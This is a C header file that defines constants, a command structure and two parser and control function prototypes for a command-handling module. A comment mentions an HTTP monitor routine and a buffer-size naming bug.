#ifndef __COMMAND_H_FILE
#define __COMMAND_H_FILE

#define COMMAND_PREFIX '^' // if you use : you\'re sexy
#define COMMAND_DELIMITER ";"
#define MAX_COMMAND_LEN 128
#define MAX_ARGUMENT_LEN 1024
#define MAX_REPLY_LEN 2048
#define MAX_DECODED_REPLY_LEN MAX_REPLY_LEN*2 //bug __monitor_http use this value but the real name is ENCODED (change)
#define MAX_ENCODED_REPLY_LEN MAX_REPLY_LEN*2
#define MAX_TOKEN_LEN 33

struct cmd_struct {
	char *cmd;
	char *arg;
	char *token;
	char *reply;
};

typedef struct cmd_struct cmd_data;


int __command_control(cmd_data *data);
int __command_parser(unsigned char *command, cmd_data *data);

#endif /* __COMMAND_H_FILE  */
